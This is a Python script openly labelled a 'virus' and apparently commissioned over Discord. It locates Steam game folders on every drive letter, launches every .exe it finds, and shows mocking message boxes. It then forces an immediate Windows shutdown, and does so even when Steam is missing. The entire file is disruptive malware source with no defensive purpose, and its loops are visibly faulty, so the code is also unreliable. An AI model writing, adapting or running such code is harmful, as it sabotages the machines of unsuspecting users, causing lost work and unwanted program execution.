# This virus was made by GLUR. And commissioned by Micromaniac#9556 on discord

# The semi-dynamic drive path finding might not be 100% clean and/or successful but since I can't be bothered to keep
# testing, and opening all my apps over and over.

# The script will take longer the more games you have, although you might not be able to see anything through all the
# exes opening.

# Not going to separate exe's onto thread to optimize performance because my brain is already dead from making dynamic
# paths

# -----------------------------------------------------------------------------------------

# Importing libs I need, very minimal this time ;)
import os
import tkinter as tk
from tkinter import messagebox as msgb

# Declaring a bunch of var's mainly for time counting
drive_times = 0
folder_times = 0
exe_amount = 0
exe_times = 0

# Var's for pathing and arrays for storing
default_path = 'C:\\Program Files (x86)\\Steam\\steamapps\\common\\'
dynamic_path = ':\\SteamLibrary\\steamapps\\common\\'
drive_array = ['A', 'B', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
               'W', 'X', 'Y', 'Z']
steam_path_array = []
exe_array = []

# Defining a neat little messagebox func
def showMessage(title, message):
    root = tk.Tk()
    root.withdraw()

    msgb.showerror(title, message)

# Checks for default sys path
isExist = os.path.exists(default_path)

# If found adds to steam_path_array
if isExist == True:
    steam_path = default_path
    steam_path_array.append(steam_path)

# Goes through all possible drive letters, and forms a dynamic path with them
while drive_times <= 24:
    isExist = os.path.exists(drive_array[drive_times] + dynamic_path)

    # If found adds to steam_path_array
    if isExist == True:
        steam_path = drive_array[drive_times] + dynamic_path
        steam_path_array.append(steam_path)
        break

    # If not found moves to the next dynamic path
    else:
        drive_times = drive_times + 1

# If user doesn't have steam, program will kill computer
if len(steam_path_array) == 0:
    showMessage('lol', 'You dont have steam installed on your system but Im going to shutdown your computer anyway')
    os.system('shutdown /s /t 1')

# Loops through how many steam paths they have
while folder_times <= len(steam_path_array):
    if isExist == True:

        # Checks through every root, dir and file in this steam path
        for root, dirs, files in os.walk(steam_path_array[folder_times]):
            for name in files:

                # Checks for exe's, generates their path dynamically and adds them to exe_array
                if name.endswith(".exe"):
                    exe_path = os.path.join(root, name)
                    exe_array.append(exe_path)

    # Creates a timer for exe running
    num_of_exe = len(exe_array)

    # Goes through and runs every exe in exe_array
    while exe_amount <= num_of_exe:
        os.startfile(exe_array[exe_times])
        exe_times = exe_times + 1

    # Loops if there is any other steam paths
    folder_times = folder_times + 1

showMessage('lol', 'You really sat through all that, well Im gonna shut down your computer anyway')
os.system('shutdown /s /t 1')